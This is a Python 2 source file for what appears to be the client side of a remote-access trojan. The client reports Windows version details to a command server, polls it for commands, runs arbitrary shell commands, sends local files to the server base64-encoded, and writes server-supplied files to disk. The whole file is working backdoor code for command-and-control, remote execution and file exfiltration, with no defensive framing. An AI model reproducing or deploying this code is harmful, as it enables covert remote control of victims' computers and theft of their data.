import subprocess
import os
import requests
import json
import base64
import windows_version_fetcher



def get_machine_info():
    bit = windows_version_fetcher.check_bit_architecure()
    win_type = windows_version_fetcher.get_windows_type()
    win_10 = windows_version_fetcher.get_windows_10_release()
    return win_type + " " + win_10 + " - " + bit


def make_dict(status, extra_data):
    return {"status": status, "extra_data": extra_data}


def check_for_new_command(SERVER_IP):
    machine_info = get_machine_info()
    try:
        ret = requests.post("http://" + SERVER_IP + "/check_for_command", json={"machine_info": machine_info}).content
        try:
            json_file = json.loads(ret)
            status = json_file["status"]
            command = json_file["command"]
            extra_data = json_file["extra_data"]
        except Exception, e:
            print "Error with one or more json keys"
            return
        if status == "1":
            if command == "download_file":
                response = download_file(extra_data)
            elif command == "upload_file":
                response = upload_file(extra_data)
            elif command == "run_cmd":
                response = run_cmd(extra_data)
            else:
                response = make_dict("0", "command not found")
            try:
                requests.post("http://" + SERVER_IP + "/process_command", json=response)
            except Exception, e:
                print "Error communicating with server: " + str(e)
        else:
            print "."
    except Exception, e:
        print "Error communicating with server: " + str(e)


def run_cmd(command):
    cmd = command["cmd"]
    try:
        ret = subprocess.check_output(cmd, shell=True)
        return make_dict("3", ret)
    except Exception, e:
        return make_dict("0", "Exception: " + str(e))


def upload_file(file_path_to_upload):
    path = file_path_to_upload["remote_path"]
    try:
        with open(path, "rb") as file:
            buf = file.read()
            buf = base64.b64encode(buf)
            file_name = os.path.basename(path)
            return make_dict("2", {"file_name": file_name, "buf": buf})
    except Exception, e:
        return make_dict("0", "Exception: " + str(e))


def download_file(data):
    path_to_download_to = data["path_to_download_to"]
    buf = base64.b64decode(data["buf"])
    try:
        with open(path_to_download_to, "wb") as file:
            file.write(buf)
    except Exception, e:
        return make_dict("0", "Exception: " + str(e))

    return make_dict("1", "File was downloaded to " + path_to_download_to + " successfully")

